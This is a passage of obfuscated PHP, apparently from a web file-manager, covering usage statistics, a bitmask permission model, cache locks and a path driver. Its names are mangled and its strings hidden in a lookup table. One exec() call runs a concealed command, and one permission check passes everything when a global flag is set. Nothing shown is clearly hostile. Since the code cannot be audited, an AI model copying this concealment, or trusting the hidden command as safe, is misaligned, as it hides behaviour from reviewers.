$E„çâÒ…±Û - 3600 * 24 * 7 * $C‰“Ìò‘º ); $F¨ùÒâÈäŞ[] = $F¡¡ƒÅ»Ùò; $C‰“Ìò‘º ++; } while ($FÎ¨­‹º¡Ÿ < $F¡¡ƒÅ»Ùò); break; case $CïÔŠ½‘˜Œ[1419]: $C‰“Ìò‘º  = 1; do { $Cƒçù¨¼¤î = date($CïÔŠ½‘˜Œ[2060], strtotime("\55\40{$C‰“Ìò‘º }\40\155\157\156\x74\150\x73")); $F¨ùÒâÈäŞ[] = $Cƒçù¨¼¤î; $C‰“Ìò‘º ++; } while ($FÎ¨­‹º¡Ÿ < $Cƒçù¨¼¤î); break; case $CïÔŠ½‘˜Œ[1728]: $f¸ë©Ğ‘ = (int) date($CïÔŠ½‘˜Œ[2059], strtotime($FÎ¨­‹º¡Ÿ)); $D¥ÎÒ”Ğ“ò = (int) date($CïÔŠ½‘˜Œ[2059]); if ($f¸ë©Ğ‘ >= $D¥ÎÒ”Ğ“ò) { break; } for ($f¸ë©Ğ‘; $f¸ë©Ğ‘ < $D¥ÎÒ”Ğ“ò; $f¸ë©Ğ‘++) { $F¨ùÒâÈäŞ[] = $f¸ë©Ğ‘ . $CïÔŠ½‘˜Œ[2061]; } break; default: break; } if ($FÎ¨­‹º¡Ÿ > end($F¨ùÒâÈäŞ)) { array_pop($F¨ùÒâÈäŞ); } sort($F¨ùÒâÈäŞ); goto cØª’ó¨Âß; c©­ŠÖî“: $CïÔŠ½‘˜Œ =& $_SERVER[”Ì÷ñ­î¸]; $dòÔñíÈÄ = date($CïÔŠ½‘˜Œ[2040], strtotime($CïÔŠ½‘˜Œ[2041])); $F¨ùÒâÈäŞ = array($dòÔñíÈÄ); goto BØùùÕ ªˆ; cØª’ó¨Âß: return $F¨ùÒâÈäŞ; goto b£Œ¿Êß¨´; b£Œ¿Êß¨´: } public function listTable($f†•Óˆœæ) { $fˆ±³ÀÊ¾ = ucfirst($f†•Óˆœæ); return Model($fˆ±³ÀÊ¾)->listData(); } public function option($BèŠ‹½˜ÍÕ) { $cŒ¤Ÿ¼¯¢‘ = $_SERVER[”Ì÷ñ­î¸][2062] . ucfirst($BèŠ‹½˜ÍÕ); return $this->{$cŒ¤Ÿ¼¯¢‘}(); } private function optionUser() { goto aëëéàª‰Œ; DÜ–´…Ê¤æ: $e¼Ñöô‰ˆ“ = strtotime($E­ë×Àø½Œ[2064]); $c“’ê‰İ² = array($E­ë×Àø½Œ[2065] => array($E­ë×Àø½Œ[930], $e¼Ñöô‰ˆ“)); $D™ÓôôÂ¸ = (int) Model($E­ë×Àø½Œ[477])->where($c“’ê‰İ²)->count($E­ë×Àø½Œ[1439]); goto cËâÏñøí¬; cËâÏñøí¬: if (!$D™ÓôôÂ¸) { $D™ÓôôÂ¸ = 1; } $e¼Ñöô‰ˆ“ = strtotime(date($E­ë×Àø½Œ[2044])); $c“’ê‰İ² = array($E­ë×Àø½Œ[2065] => array($E­ë×Àø½Œ[930], $e¼Ñöô‰ˆ“)); goto C×¯é†ää„; aëëéàª‰Œ: $E­ë×Àø½Œ =& $_SERVER[”Ì÷ñ­î¸]; $e¢Ä»×ì¨» = Model($E­ë×Àø½Œ[477])->count($E­ë×Àø½Œ[1439]); $dÉÏ®ÀÂÙ× = Model($E­ë×Àø½Œ[477])->where($E­ë×Àø½Œ[2063])->count($E­ë×Àø½Œ[1439]); goto DÜ–´…Ê¤æ; C×¯é†ää„: $Aìøùæ÷‚Ï = Model($E­ë×Àø½Œ[477])->where($c“’ê‰İ²)->count($E­ë×Àø½Œ[1439]); return array($E­ë×Àø½Œ[696] => (int) $e¢Ä»×ì¨», $E­ë×Àø½Œ[2066] => (int) ($e¢Ä»×ì¨» - $dÉÏ®ÀÂÙ×), $E­ë×Àø½Œ[2067] => (int) $dÉÏ®ÀÂÙ×, $E­ë×Àø½Œ[2068] => (int) $Aìøùæ÷‚Ï, $E­ë×Àø½Œ[2069] => $D™ÓôôÂ¸); goto cÕ´†ŠƒÄù; cÕ´†ŠƒÄù: } private function optionFile() { goto cÖÒ…«µ¢§; Eø†Ï¼ğÈ®: $c‚çğŠ¯£ = Model($b„±«â®óÎ[754])->where($côÛÆŞì£°)->sum($b„±«â®óÎ[77]); $B´Ô…ÚÂâ = Model($b„±«â®óÎ[754])->where($côÛÆŞì£°)->count($b„±«â®óÎ[369]); return array($b„±«â®óÎ[699] => $E—äœÛ©İ , $b„±«â®óÎ[2037] => $f´öÛÇèÈ, $b„±«â®óÎ[2070] => $E—äœÛ©İ  - $f´öÛÇèÈ, $b„±«â®óÎ[2071] => (int) $c‚çğŠ¯£, $b„±«â®óÎ[701] => (int) $dìòÁì‹ƒÈ, $b„±«â®óÎ[2072] => (int) $B´Ô…ÚÂâ); goto f¥ôÎĞğ‚½; FÅ·–áÄù: $f´öÛÇèÈ = $b«Ö‹Á®‚ã[$b„±«â®óÎ[2037]]; $dìòÁì‹ƒÈ = Model($b„±«â®óÎ[754])->where(array($b„±«â®óÎ[370] => 0))->count($b„±«â®óÎ[369]); $côÛÆŞì£° = array($b„±«â®óÎ[370] => 0, $b„±«â®óÎ[187] => array($b„±«â®óÎ[930], strtotime(date($b„±«â®óÎ[2044])))); goto Eø†Ï¼ğÈ®; cÖÒ…«µ¢§: $b„±«â®óÎ =& $_SERVER[”Ì÷ñ­î¸]; $b«Ö‹Á®‚ã = $this->sourceSize(); $E—äœÛ©İ  = $b«Ö‹Á®‚ã[$b„±«â®óÎ[77]]; goto FÅ·–áÄù; f¥ôÎĞğ‚½: } private function optionAccess() { $dïôÎÂ =& $_SERVER[”Ì÷ñ­î¸]; return array($dïôÎÂ[696] => $this->typeLogCnt(), $dïôÎÂ[103] => $this->typeLogCnt($dïôÎÂ[103]), $dïôÎÂ[404] => $this->typeLogCnt($dïôÎÂ[404]), $dïôÎÂ[2073] => $this->typeLogCnt($dïôÎÂ[2073]), $dïôÎÂ[2074] => $this->typeLogCnt($dïôÎÂ[2074]), $dïôÎÂ[535] => $this->typeLogCnt($dïôÎÂ[33], $dïôÎÂ[2048])); } private function typeLogCnt($F²¥È×©›º = '', $c¡¢‰ßÇÖã = "\x69\144") { goto eªƒØ¦ šÑ; d‚…í˜¹š: return (int) $fóóé‘Ù¯¨; goto EÙ ğ‰¼Ô©; eªƒØ¦ šÑ: $a¹àã¬ØÅ =& $_SERVER[”Ì÷ñ­î¸]; $aµÉ²ï£Û = array($a¹àã¬ØÅ[103] => array($a¹àã¬ØÅ[2075], $a¹àã¬ØÅ[2076]), $a¹àã¬ØÅ[404] => array($a¹àã¬ØÅ[2077], $a¹àã¬ØÅ[2078]), $a¹àã¬ØÅ[2073] => array($a¹àã¬ØÅ[2079], $a¹àã¬ØÅ[2080]), $a¹àã¬ØÅ[2074] => array($a¹àã¬ØÅ[2081], $a¹àã¬ØÅ[2082]), $a¹àã¬ØÅ[2083] => array($a¹àã¬ØÅ[2084], $a¹àã¬ØÅ[2085], $a¹àã¬ØÅ[2086])); $B¬ìŒ¹§ì = strtotime(date($a¹àã¬ØÅ[2044])); goto F„ŞóÈó¡ë; F„ŞóÈó¡ë: $AÃÂÄŠÏå× = array($a¹àã¬ØÅ[187] => array($a¹àã¬ØÅ[930], $B¬ìŒ¹§ì)); if ($F²¥È×©›º) { $AÃÂÄŠÏå×[$a¹àã¬ØÅ[29]] = array($a¹àã¬ØÅ[7], $aµÉ²ï£Û[$F²¥È×©›º]); } $fóóé‘Ù¯¨ = Model($a¹àã¬ØÅ[2047])->where($AÃÂÄŠÏå×)->count($c¡¢‰ßÇÖã); goto d‚…í˜¹š; EÙ ğ‰¼Ô©: } private function optionServer() { goto dÎ„ÎòÜ¬ù; d‡›±‹Š……: $EÙÕ°¥ÍŠ = array($Bí‹¥âÈ»ñ[745] => $F¢Ø±âİÂù[$Bí‹¥âÈ»ñ[367]]); $fÈâ¨è‹Œ = Model($Bí‹¥âÈ»ñ[422])->where($EÙÕ°¥ÍŠ)->sum($Bí‹¥âÈ»ñ[77]); $B‘‰ôì†Ÿ¦ = explode($Bí‹¥âÈ»ñ[50], $_SERVER[$Bí‹¥âÈ»ñ[139]]); goto aåêß¦œ˜”; dÎ„ÎòÜ¬ù: $Bí‹¥âÈ»ñ =& $_SERVER[”Ì÷ñ­î¸]; $C ‹©¼Ş ƒ = $this->diskDriver(); $F¢Ø±âİÂù = KodIO::defaultDriver(); goto d‡›±‹Š……; dƒİ­»±†: return array($Bí‹¥âÈ»ñ[2089] => $C ‹©¼Ş ƒ ? $C ‹©¼Ş ƒ[$Bí‹¥âÈ»ñ[2090]] : 0, $Bí‹¥âÈ»ñ[2091] => $C ‹©¼Ş ƒ ? $C ‹©¼Ş ƒ[$Bí‹¥âÈ»ñ[2092]] : 0, $Bí‹¥âÈ»ñ[2093] => (int) $F¢Ø±âİÂù[$Bí‹¥âÈ»ñ[2090]] * 1024 * 1024 * 1024, $Bí‹¥âÈ»ñ[2094] => (int) $fÈâ¨è‹Œ, $Bí‹¥âÈ»ñ[2095] => ucfirst($AÚÜ‰‘î…Š), $Bí‹¥âÈ»ñ[2096] => $Bí‹¥âÈ»ñ[2097] . PHP_VERSION, $Bí‹¥âÈ»ñ[2098] => phpBuild64() ? 64 : 32, $Bí‹¥âÈ»ñ[695] => str_replace($Bí‹¥âÈ»ñ[2099], $Bí‹¥âÈ»ñ[906], $F±ËÀØœ•„), $Bí‹¥âÈ»ñ[337] => ucfirst($c¢ˆ Î‡Â½), $Bí‹¥âÈ»ñ[28] => $_SERVER[$Bí‹¥âÈ»ñ[2100]]); goto C ˜‡¯¼Àå; aåêß¦œ˜”: $AÚÜ‰‘î…Š = $B‘‰ôì†Ÿ¦[0]; $AÛ¯‡ç‚Š = $GLOBALS[$Bí‹¥âÈ»ñ[6]][$Bí‹¥âÈ»ñ[17]]; $F±ËÀØœ•„ = $AÛ¯‡ç‚Š[$Bí‹¥âÈ»ñ[890]]; goto dÃÁÛ¶×ñï; dÃÁÛ¶×ñï: if ($F±ËÀØœ•„ == $Bí‹¥âÈ»ñ[725]) { $bËİãÛÑ¦Ó = explode($Bí‹¥âÈ»ñ[1076], $AÛ¯‡ç‚Š[$Bí‹¥âÈ»ñ[889]]); $F±ËÀØœ•„ = $bËİãÛÑ¦Ó[0]; } if ($F±ËÀØœ•„ == $Bí‹¥âÈ»ñ[728] || $F±ËÀØœ•„ == $Bí‹¥âÈ»ñ[729]) { $F‹ÊõêÔ†´ = Model()->db()->query($Bí‹¥âÈ»ñ[2087]); $aƒƒƒÄËƒ = $F‹ÊõêÔ†´[0] && isset($F‹ÊõêÔ†´[0][$Bí‹¥âÈ»ñ[1343]]) ? $F‹ÊõêÔ†´[0][$Bí‹¥âÈ»ñ[1343]] : 0; $F±ËÀØœ•„ = $Bí‹¥âÈ»ñ[2088] . ($aƒƒƒÄËƒ ? $Bí‹¥âÈ»ñ[8] . $aƒƒƒÄËƒ : $Bí‹¥âÈ»ñ[33]); } $c¢ˆ Î‡Â½ = $GLOBALS[$Bí‹¥âÈ»ñ[6]][$Bí‹¥âÈ»ñ[337]][$Bí‹¥âÈ»ñ[755]]; goto dƒİ­»±†; C ˜‡¯¼Àå: } private function diskDriver() { goto E–Ë ç²ùƒ; bµŸªñ˜ë§: if ($fÁæÊÒù) { $BÕ¾¶ÚŒ = $dÚ²“×®‡ø[2103]; if (function_exists($dÚ²“×®‡ø[2104])) { exec($dÚ²“×®‡ø[2105], $EÊ¦†¡à¬¡); $BÕ¾¶ÚŒ = $EÊ¦†¡à¬¡[1] . $dÚ²“×®‡ø[8]; } } if (!file_exists($BÕ¾¶ÚŒ)) { return; } $EÊ°ÖŒ«· = @disk_total_space($BÕ¾¶ÚŒ); goto e”…‹“Ôğˆ; e”…‹“Ôğˆ: $c‹®ïù’¬‹ = $EÊ°ÖŒ«· - @disk_free_space($BÕ¾¶ÚŒ); return array($dÚ²“×®‡ø[2090] => $EÊ°ÖŒ«·, $dÚ²“×®‡ø[2092] => $c‹®ïù’¬‹); goto c¸”õÔ‰â‚; E–Ë ç²ùƒ: $dÚ²“×®‡ø =& $_SERVER[”Ì÷ñ­î¸]; $BÕ¾¶ÚŒ = $dÚ²“×®‡ø[8]; $fÁæÊÒù = $GLOBALS[$dÚ²“×®‡ø[6]][$dÚ²“×®‡ø[2101]] == $dÚ²“×®‡ø[2102]; goto bµŸªñ˜ë§; c¸”õÔ‰â‚: } public function fileChart($b»æöÊÃÌ®) { goto dò‰¦à¹Ÿ¤; dï¼òŒ²‡: $CÕ‘‚âêĞ = $this->sourceSize(); $bƒ´ÜÙ‚¯ = array($bÎêåìØÅ[461] => 0, $bÎêåìØÅ[371] => 1); $dÍè¢˜¢ô = Model($bÎêåìØÅ[754])->where($bƒ´ÜÙ‚¯)->sum($bÎêåìØÅ[77]); goto a©¹ø²¯¡; dò‰¦à¹Ÿ¤: $bÎêåìØÅ =& $_SERVER[”Ì÷ñ­î¸]; if (isset($b»æöÊÃÌ®[$bÎêåìØÅ[1439]])) { return Model($bÎêåìØÅ[754])->userFileTypeProfile($b»æöÊÃÌ®[$bÎêåìØÅ[1439]]); } if (isset($b»æöÊÃÌ®[$bÎêåìØÅ[2106]])) { return Model($bÎêåìØÅ[754])->groupFileTypeProfile($b»æöÊÃÌ®[$bÎêåìØÅ[2106]]); } goto dï¼òŒ²‡; a©¹ø²¯¡: $bƒ´ÜÙ‚¯[$bÎêåìØÅ[371]] = 2; $e›Ñ±÷±Ïå = Model($bÎêåìØÅ[754])->where($bƒ´ÜÙ‚¯)->sum($bÎêåìØÅ[77]); return array($bÎêåìØÅ[699] => $CÕ‘‚âêĞ[$bÎêåìØÅ[77]], $bÎêåìØÅ[2037] => $CÕ‘‚âêĞ[$bÎêåìØÅ[2037]], $bÎêåìØÅ[2038] => (int) $dÍè¢˜¢ô, $bÎêåìØÅ[2039] => (int) $e›Ñ±÷±Ïå); goto fÎœ½Šò¨; fÎœ½Šò¨: } private function sourceSize() { $E»ù»ù–Š¬ =& $_SERVER[”Ì÷ñ­î¸]; $AÎ˜°ù„ò» = Model($E»ù»ù–Š¬[754])->where(array($E»ù»ù–Š¬[370] => 0))->sum($E»ù»ù–Š¬[77]); $dŒí®¦Ì‰” = Model($E»ù»ù–Š¬[422])->sum($E»ù»ù–Š¬[77]); if ($dŒí®¦Ì‰” > $AÎ˜°ù„ò») { $dŒí®¦Ì‰” = $AÎ˜°ù„ò»; } return array($E»ù»ù–Š¬[77] => (int) $AÎ˜°ù„ò», $E»ù»ù–Š¬[2037] => (int) $dŒí®¦Ì‰”); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authDefault() { $aºó„”Áö =& $_SERVER[”Ì÷ñ­î¸]; $cæ‚ìÔè–° = array(array($aºó„”Áö[386] => LNG($aºó„”Áö[2107]), $aºó„”Áö[2108] => $aºó„”Áö[2109], $aºó„”Áö[2110] => 6, $aºó„”Áö[2111] => 1, $aºó„”Áö[2112] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($aºó„”Áö[386] => LNG($aºó„”Áö[2113]), $aºó„”Áö[2108] => $aºó„”Áö[2114], $aºó„”Áö[2110] => 1, $aºó„”Áö[2111] => 1, $aºó„”Áö[2112] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($aºó„”Áö[386] => LNG($aºó„”Áö[2115]), $aºó„”Áö[2108] => $aºó„”Áö[2116], $aºó„”Áö[2110] => 2, $aºó„”Áö[2111] => 1, $aºó„”Áö[2112] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($aºó„”Áö[386] => LNG($aºó„”Áö[2117]), $aºó„”Áö[2108] => $aºó„”Áö[2116], $aºó„”Áö[2110] => 3, $aºó„”Áö[2111] => 1, $aºó„”Áö[2112] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($aºó„”Áö[386] => LNG($aºó„”Áö[2118]), $aºó„”Áö[2108] => $aºó„”Áö[2119], $aºó„”Áö[2110] => 4, $aºó„”Áö[2111] => 1, $aºó„”Áö[2112] => self::AUTH_SHOW | self::AUTH_VIEW), array($aºó„”Áö[386] => LNG($aºó„”Áö[2120]), $aºó„”Áö[2108] => $aºó„”Áö[2121], $aºó„”Áö[2110] => 5, $aºó„”Áö[2111] => 1, $aºó„”Áö[2112] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($aºó„”Áö[386] => LNG($aºó„”Áö[2122]), $aºó„”Áö[2108] => $aºó„”Áö[2123], $aºó„”Áö[2110] => 7, $aºó„”Áö[2111] => 1, $aºó„”Áö[2112] => 0)); return $cæ‚ìÔè–°; } public static function authCheck($d¨Ñğ»ù—, $Fôˆ¬¤Íí‡) { $d¨Ñğ»ù— = intval($d¨Ñğ»ù—); if (_get($GLOBALS, $_SERVER[”Ì÷ñ­î¸][457])) { return !0; } if ($d¨Ñğ»ù— <= 0) { return !1; } if (($d¨Ñğ»ù— & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($d¨Ñğ»ù— & $Fôˆ¬¤Íí‡); } public static function authCheckShow($a° ¸·†Š­) { return self::authCheck($a° ¸·†Š­, self::AUTH_SHOW); } public static function authCheckView($EÒĞå‹ç) { return self::authCheck($EÒĞå‹ç, self::AUTH_VIEW); } public static function authCheckDownload($F˜¶£½ÚÖ) { return self::authCheck($F˜¶£½ÚÖ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($B ¶‰–…Ç´) { return self::authCheck($B ¶‰–…Ç´, self::AUTH_UPLOAD); } public static function authCheckEdit($fÕğÒÚàá) { return self::authCheck($fÕğÒÚàá, self::AUTH_EDIT); } public static function authCheckRemove($aŒ‡ÒÓ­ÑÌ) { return self::authCheck($aŒ‡ÒÓ­ÑÌ, self::AUTH_REMOVE); } public static function authCheckShare($FíÙóêÎìŠ) { return self::authCheck($FíÙóêÎìŠ, self::AUTH_SHARE); } public static function authCheckComment($E¬éÄµÊè) { return self::authCheck($E¬éÄµÊè, self::AUTH_COMMENT); } public static function authCheckEvent($AÌùÖ«Š«š) { return self::authCheck($AÌùÖ«Š«š, self::AUTH_EVENT); } public static function authCheckRoot($D¬ƒ‹‹“¤) { return self::authCheck($D¬ƒ‹‹“¤, self::AUTH_ROOT); } public static function authDisable($fÕÑ£‹ˆ, $a‡á³„Ûë‹) { if (intval($fÕÑ£‹ˆ) <= 0) { return 0; } return intval($fÕÑ£‹ˆ) & ~$a‡á³„Ûë‹; } public $optionType = "\x53\x79\163\x74\x65\155\56\163\x6f\165\162\143\145\x41\165\164\150\x4c\151\x73\x74"; public $field = array("\156\x61\155\145", "\141\165\164\x68", "\x6c\x61\142\145\x6c", "\144\x69\163\x70\154\x61\171", "\x73\171\x73\164\145\x6d", "\163\157\x72\x74"); public function initData() { $E¦±Â„Óå = $this->authDefault(); foreach ($E¦±Â„Óå as $CÊÑ±ÄË´Æ) { $this->add($CÊÑ±ÄË´Æ); } } public function listData($E¿òº‘÷„ê = false, $eã¨ƒË‰™ó = "\163\x6f\162\x74", $fÈµÊÙè„Î = false) { return parent::listData($E¿òº‘÷„ê, $eã¨ƒË‰™ó, $fÈµÊÙè„Î); } public function update($CŠ±éóÑ…Œ, $Eˆ¸¯ °ÄÛ) { $B Ê­ß¾‡  =& $_SERVER[”Ì÷ñ­î¸]; $C§Êçº¶–ë = parent::listData($CŠ±éóÑ…Œ); $a½ëÙ¦ÕŸ = $this->findByName($Eˆ¸¯ °ÄÛ[$B Ê­ß¾‡ [28]]); if (!$C§Êçº¶–ë || $a½ëÙ¦ÕŸ && $a½ëÙ¦ÕŸ[$B Ê­ß¾‡ [367]] != $C§Êçº¶–ë[$B Ê­ß¾‡ [367]]) { return !1; } $this->filterAuth($Eˆ¸¯ °ÄÛ[$B Ê­ß¾‡ [376]]); return parent::update($CŠ±éóÑ…Œ, $Eˆ¸¯ °ÄÛ); } public function remove($EÔ¢¦áÙŸ) { $b“½ƒ¼½’» = parent::listData($EÔ¢¦áÙŸ); if (!$b“½ƒ¼½’» || $b“½ƒ¼½’»[$_SERVER[”Ì÷ñ­î¸][1080]]) { return !1; } return parent::remove($EÔ¢¦áÙŸ); } public function add($aë«–†òÆò = array()) { goto c¥ãŒƒ†³²; c¥ãŒƒ†³²: $BÍÁ­äÇ±ï =& $_SERVER[”Ì÷ñ­î¸]; if ($this->findByName($aë«–†òÆò[$BÍÁ­äÇ±ï[28]])) { return !1; } $f”é›ŠØ…Û = array($BÍÁ­äÇ±ï[28] => $BÍÁ­äÇ±ï[33], $BÍÁ­äÇ±ï[376] => 1, $BÍÁ­äÇ±ï[2124] => $BÍÁ­äÇ±ï[2125], $BÍÁ­äÇ±ï[2126] => 1, $BÍÁ­äÇ±ï[1080] => 0, $BÍÁ­äÇ±ï[2127] => 0); goto cİ«İÒ•ÌÛ; B©§éŞšŸä: return parent::insert($aë«–†òÆò); goto dÓÉ¡¯·ã; cİ«İÒ•ÌÛ: $aë«–†òÆò = array_merge($f”é›ŠØ…Û, $aë«–†òÆò); $aë«–†òÆò[$BÍÁ­äÇ±ï[2127]] = $this->getSort(); $this->filterAuth($aë«–†òÆò[$BÍÁ­äÇ±ï[376]]); goto B©§éŞšŸä; dÓÉ¡¯·ã: } private function getSort() { $Bù¿É¶Åİù =& $_SERVER[”Ì÷ñ­î¸]; $f‡İìù‡Şš = parent::listData(); $Fµ÷°‚—ÆÛ = array_to_keyvalue($f‡İìù‡Şš, $Bù¿É¶Åİù[33], $Bù¿É¶Åİù[2127]); return empty($Fµ÷°‚—ÆÛ) ? 0 : max($Fµ÷°‚—ÆÛ) + 1; } private function filterAuth(&$cØãáØ•³ï) { goto f¬ãÁ’µÜï; D½‹Îä…¹á: foreach ($D¦ö¶ó°™Š as $díá‘›ëÓ¨) { if ($cØãáØ•³ï & $díá‘›ëÓ¨) { $c…È›Ä¿–¯[] = $díá‘›ëÓ¨; } } if (in_array(self::AUTH_ROOT, $c…È›Ä¿–¯)) { $cØãáØ•³ï = array_sum($D¦ö¶ó°™Š); return; } $aÖ÷Œ™·Ç = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto a¡ªìÌí„±; f¬ãÁ’µÜï: if (!$cØãáØ•³ï) { return; } $D¦ö¶ó°™Š = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $c…È›Ä¿–¯ = array(); goto D½‹Îä…¹á; a¡ªìÌí„±: foreach ($c…È›Ä¿–¯ as $díá‘›ëÓ¨) { if (isset($aÖ÷Œ™·Ç[$díá‘›ëÓ¨])) { $c…È›Ä¿–¯ = array_merge($c…È›Ä¿–¯, $aÖ÷Œ™·Ç[$díá‘›ëÓ¨]); } } $c…È›Ä¿–¯[] = self::AUTH_SHOW; $cØãáØ•³ï = array_sum(array_unique($c…È›Ä¿–¯)); goto D¶§Æ×¡—ç; D¶§Æ×¡—ç: } public function sort($dÌîÏŞå¹, $DïÌŠÌ—†) { return parent::update($dÌîÏŞå¹, $DïÌŠÌ—†); } } goto F²°‹É¨; Eöœä†•–‘: class CacheLockMemcached { public function lock($B˜¤£ìöµá, $dƒÊ“šĞƒÓ = 0) { $aÇã«Æ²Ç® = Cache::init(); $AÕƒĞ„Å‚ù = microtime(!0) + $dƒÊ“šĞƒÓ; while (microtime(!0) < $AÕƒĞ„Å‚ù) { $a±–é‚´á = $aÇã«Æ²Ç®->get($B˜¤£ìöµá); if (!$a±–é‚´á || $a±–é‚´á < microtime(!0)) { $D×ãƒš÷Ä¢ = $aÇã«Æ²Ç®->handle->add($B˜¤£ìöµá, $AÕƒĞ„Å‚ù, $dƒÊ“šĞƒÓ); if ($D×ãƒš÷Ä¢) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($fÄâ§ÙÈË…) { return Cache::init()->get($fÄâ§ÙÈË…); } public function unlock($a¤©¹š¬¡ñ) { return Cache::init()->remove($a¤©¹š¬¡ñ); } } class CacheLockDatabase { public function lock($cÌÅ§µÅƒ, $aŠõªâÁ¤á = 0) { $B©Ñì¦Â¿Š = Model($_SERVER[”Ì÷ñ­î¸][757]); $Eù½ù“¤Õ× = microtime(!0) + $aŠõªâÁ¤á; while (microtime(!0) < $Eù½ù“¤Õ×) { $b‰òäÓ×è = $B©Ñì¦Â¿Š->get($cÌÅ§µÅƒ); if (!$b‰òäÓ×è || $b‰òäÓ×è < microtime(!0)) { $eØê¾Æ‹ = $B©Ñì¦Â¿Š->set($cÌÅ§µÅƒ, $Eù½ù“¤Õ×); if ($eØê¾Æ‹) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($CĞ÷œˆÒÄÜ) { return Model($_SERVER[”Ì÷ñ­î¸][757])->get($CĞ÷œˆÒÄÜ); } public function unlock($fŠ¦£Ìå¿Á) { Model($_SERVER[”Ì÷ñ­î¸][757])->remove($fŠ¦£Ìå¿Á); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($dˆÈŒ“Ù•¦, $E… ¢ÏÊ‘Ë) { $FŠ‡†º™¬ =& $_SERVER[”Ì÷ñ­î¸]; if (!class_exists($FŠ‡†º™¬[778])) { show_json($FŠ‡†º™¬[779], !1); } $this->cacheTime = $E… ¢ÏÊ‘Ë; $this->handle = new Memcached(); if (is_array($dˆÈŒ“Ù•¦[$FŠ‡†º™¬[780]]) && count($dˆÈŒ“Ù•¦[$FŠ‡†º™¬[780]]) >= 1) { foreach ($dˆÈŒ“Ù•¦[$FŠ‡†º™¬[780]] as $cïö‰…Šàğ) { $E¹”Ü“™Ìñ = explode($FŠ‡†º™¬[4], $cïö‰…Šàğ); $this->handle->addServer($E¹”Ü“™Ìñ[0], $E¹”Ü“™Ìñ[1]); } } else { $this->handle->addServer($dˆÈŒ“Ù•¦[$FŠ‡†º™¬[169]], $dˆÈŒ“Ù•¦[$FŠ‡†º™¬[170]]); } } public function set($e’ø¾ÔÜãœ, $fÂÚšçé©ˆ, $B¡¨Ç‹•è  = false) { $B¡¨Ç‹•è  = $B¡¨Ç‹•è  ? $B¡¨Ç‹•è  : $this->cacheTime; return $this->handle->set($e’ø¾ÔÜãœ, $fÂÚšçé©ˆ, $B¡¨Ç‹•è ); } public function get($c«×––›½¨) { return $this->handle->get($c«×––›½¨); } public function remove($Cì“•ô©à) { return $this->handle->delete($Cì“•ô©à); } public function deleteAll() { return $this->handle->flush(); } } goto EšÈñŒğÙ¸; CŠèøÙØâ: class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($bÇë·¬Ãó•) { if (substr($bÇë·¬Ãó•, 0, 2) == $_SERVER[”Ì÷ñ­î¸][1157]) { $bÇë·¬Ãó• = BASIC_PATH . substr($bÇë·¬Ãó•, 2); } return $bÇë·¬Ãó•; } public function iconvApp($E„Ò£Çó¢…) { $cŠŒæ±óŸÔ =& $_SERVER[”Ì÷ñ­î¸]; global $config; return $this->iconvTo($E„Ò£Çó¢…, $config[$cŠŒæ±óŸÔ[1155]], $config[$cŠŒæ±óŸÔ[1154]]); } public function iconvSystem($f™±™†åœ) { $eí¼ŒèÑ¸¢ =& $_SERVER[”Ì÷ñ­î¸]; global $config; return $this->iconvTo($f™±™†åœ, $config[$eí¼ŒèÑ¸¢[1154]], $config[$eí¼ŒèÑ¸¢[1155]]); } public function getPathOuter($c…¬¼©ƒğ) { goto f¨ÀÏïàª©; eŸ¥¼ô©Ã­: return $this->pathDriver . $d£øÕ§‰‘ö[8] . ltrim($c…¬¼©ƒğ, $d£øÕ§‰‘ö[8]); goto A¦Òæåóåø; f¨ÀÏïàª©: $d£øÕ§‰‘ö =& $_SERVER[”Ì÷ñ­î¸]; $EÇ»ëÁ© = $this->iconvApp($this->pathBase); $c…¬¼©ƒğ = $this->iconvApp($c…¬¼©ƒğ); goto Cª–ŞîÑ; Cª–ŞîÑ: if (substr($EÇ»ëÁ©, 0, 2) == $d£øÕ§‰‘ö[1157]) { $EÇ»ëÁ© = BASIC_PATH . substr($EÇ»ëÁ©, 2); } if (substr($c…¬¼©ƒğ, 0, 2) == $d£øÕ§‰‘ö[1157]) { $c…¬¼©ƒğ = BASIC_PATH . substr($c…¬¼©ƒğ, 2); } $EÇ»ëÁ© = KodIO::clear($EÇ»ëÁ©); goto eï®Ø¨êÎ; eï®Ø¨êÎ: $c…¬¼©ƒğ = KodIO::clear($c…¬¼©ƒğ); $c…¬¼©ƒğ = substr($c…¬¼©ƒğ, strlen($EÇ»ëÁ©)); if (empty($this->pathDriver)) { return $c…¬¼©ƒğ; } goto eŸ¥¼ô©Ã­; A¦Òæåóåø: } public function 